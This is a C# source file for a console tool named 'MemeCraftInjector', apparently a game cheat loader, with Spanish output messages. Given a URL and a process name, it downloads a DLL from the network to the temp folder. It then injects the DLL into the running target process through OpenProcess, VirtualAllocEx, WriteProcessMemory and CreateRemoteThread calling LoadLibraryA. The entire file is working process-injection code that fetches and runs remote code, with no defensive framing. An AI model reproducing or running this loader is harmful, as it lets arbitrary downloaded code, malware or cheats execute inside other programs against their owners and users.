using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;

namespace MemeCraftInjector
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                Console.WriteLine("USO: injector.exe <dll_url> <process_name>");
                return;
            }

            string dllUrl = args[0];
            string processName = args[1];
            string dllPath = Path.Combine(Path.GetTempPath(), Path.GetFileName(new Uri(dllUrl).LocalPath));

            Console.WriteLine($"Descargando DLL desde {dllUrl}...");
            using (WebClient wc = new WebClient())
            {
                wc.DownloadFile(dllUrl, dllPath);
            }
            Console.WriteLine($"DLL descargada a {dllPath}");

            Console.WriteLine($"Buscando proceso {processName}...");
            Process[] procs = Process.GetProcessesByName(processName);
            if (procs.Length == 0)
            {
                Console.WriteLine("ERROR: No se encontro el proceso en ejecucion");
                return;
            }
            Console.WriteLine($"Proceso encontrado: PID {procs[0].Id}");

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, procs[0].Id);
            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("ERROR: No se pudo abrir el proceso (ejecutar como admin)");
                return;
            }

            IntPtr loadLibAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            if (loadLibAddr == IntPtr.Zero)
            {
                Console.WriteLine("ERROR: No se pudo obtener LoadLibraryA");
                CloseHandle(hProcess);
                return;
            }

            IntPtr remoteMem = VirtualAllocEx(hProcess, IntPtr.Zero, (dllPath.Length + 1), 0x3000, 0x04);
            if (remoteMem == IntPtr.Zero)
            {
                Console.WriteLine("ERROR: No se pudo reservar memoria remota");
                CloseHandle(hProcess);
                return;
            }

            byte[] bytes = System.Text.Encoding.ASCII.GetBytes(dllPath);
            bool written = WriteProcessMemory(hProcess, remoteMem, bytes, bytes.Length, out int bytesWritten);
            if (!written || bytesWritten == 0)
            {
                Console.WriteLine("ERROR: No se pudo escribir en memoria remota");
                VirtualFreeEx(hProcess, remoteMem, 0, 0x8000);
                CloseHandle(hProcess);
                return;
            }

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibAddr, remoteMem, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine("ERROR: No se pudo crear el hilo remoto");
                VirtualFreeEx(hProcess, remoteMem, 0, 0x8000);
                CloseHandle(hProcess);
                return;
            }

            WaitForSingleObject(hThread, 5000);
            CloseHandle(hThread);
            VirtualFreeEx(hProcess, remoteMem, 0, 0x8000);
            CloseHandle(hProcess);

            Console.WriteLine("DLL inyectada correctamente");
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint dwFreeType);
    }
}
